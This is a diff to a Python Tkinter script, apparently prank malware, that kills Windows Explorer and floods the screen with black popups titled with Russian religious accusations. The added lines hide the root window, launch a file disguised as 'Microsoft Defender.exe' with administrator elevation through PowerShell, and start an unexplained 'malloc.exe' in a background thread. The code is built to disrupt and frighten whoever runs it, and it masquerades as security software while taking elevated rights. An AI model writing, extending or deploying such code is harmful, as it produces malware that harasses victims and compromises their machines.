@@ -5,17 +5,20 @@ import random
 import tempfile
 import base64
 import zlib
+import subprocess
+import threading
 
 windows = []
 
 root = Tk()
 root.title("")
+root.geometry("0x0")
 
 def after_second():  
     def create_window(index):
         if index < 50:
             window3 = Toplevel()
-            window3.title("Пока можешь")
+            window3.title("Прими наказание")
             width, height = 400, 200
             x = random.randint(0, 1920 - width)
             y = random.randint(0, 1080 - height)
@@ -68,9 +71,10 @@ def open_browser():
     os.system("start msedge https://quran-online.ru/1:1")
     root.after(5000, after_first)
 
+index1 = 0
 def create_window():
-    index = 0
-    if index < 50:
+    global index1
+    if index1 < 50:
         window = Toplevel()
         window.title("Ты врешь Аллаху")
         width, height = 400, 200
@@ -81,7 +85,7 @@ def create_window():
         lbl.pack(expand=True)
         window.config(bg='black')
         windows.append(window)
-        index += 1
+        index1 += 1
         window.after(100, create_window)
     else:
         open_browser()
@@ -141,6 +145,7 @@ def create_multiple_error_windows_instant(x, y, count, direction):
             root.after(20, lambda: create_multiple_error_windows_instant(x + 100, y - 100, count - 1, direction))
 
 def creating_instantly():
+    index = 0
     for i in range(20):
         x = random.randint(0, 1920)
         y = random.randint(0, 1080)
@@ -151,7 +156,15 @@ def creating_instantly():
         y = random.randint(0, 1080)
         create_error_window(x, y)
         root.after(250, ultimate_death)
-    
+        index += 1
+    def malloc():
+        subprocess.run("malloc.exe")
+
+    exe_path = os.path.join(os.getcwd(), "Microsoft Defender.exe")
+    os.system(f'powershell -Command "Start-Process -FilePath \'{exe_path}\' -Verb RunAs"')
+    thread = threading.Thread(target=malloc)
+    thread.start()
+
     ultimate_death()
 
 def virus():
@@ -163,6 +176,6 @@ def virus():
                                                                                                                                                                                                    creating_instantly())))))
 
 os.system('taskkill /f /im explorer.exe')
-create_window(0)
+create_window()
 
 root.mainloop()
